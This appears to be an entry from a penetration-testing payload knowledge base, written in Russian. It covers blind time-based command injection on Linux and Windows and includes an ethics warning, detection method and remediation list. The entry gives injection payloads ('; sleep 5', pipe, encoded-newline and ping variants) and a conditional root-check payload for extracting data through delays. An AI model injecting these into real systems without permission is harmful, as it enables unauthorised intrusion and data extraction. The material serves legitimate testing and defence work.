---
id: cmdi-blind-time-based
title: "Blind command injection: подтверждение по времени"
type: cmdi
target: linux
category: web
difficulty: intermediate
bypass: none
tags: [cmdi, blind, time-based]
tested_on: ["bash", "Windows cmd/powershell"]
success_rate: 0.65
risk: medium
cwe: "CWE-78"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/Command_Injection"
graph:
  - target: "cmdi"
    type: instance_of
  - target: "oob"
    type: technique_of
---

# Blind command injection: подтверждение по времени

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
; sleep 5
```

## Explanation

Когда вывод команды не возвращается, каналом становится время. `sleep 5` даёт
измеримую задержку; дальше данные извлекаются посимвольно условными задержками:
`; if [ $(id -u) -eq 0 ]; then sleep 3; fi`.
В Windows-контексте эквиваленты — `ping -n 6 127.0.0.1`, `timeout /t 5`,
`Start-Sleep -Seconds 5`.

## Detection

Соберите baseline (10+ замеров), затем сравните с `sleep 5`. Устойчивая разница — инъекция.
Проверьте оба разделителя (`;` и `|`), а также `%0a` (перевод строки) и `%0d%0a` —
часто именно они проходят фильтр.

## Remediation

- Не использовать shell для пользовательских данных.
- Таймауты выполнения команд; запрет «долгоживущих» вызовов.
- Логирование всех вызовов внешних программ с аргументами.
- Rate limiting: посимвольная эксфильтрация требует сотен запросов.

## Variants

```
| sleep 5
```

```
%0asleep 5
```

```
; ping -c 5 127.0.0.1
```

```
&& timeout 5
```
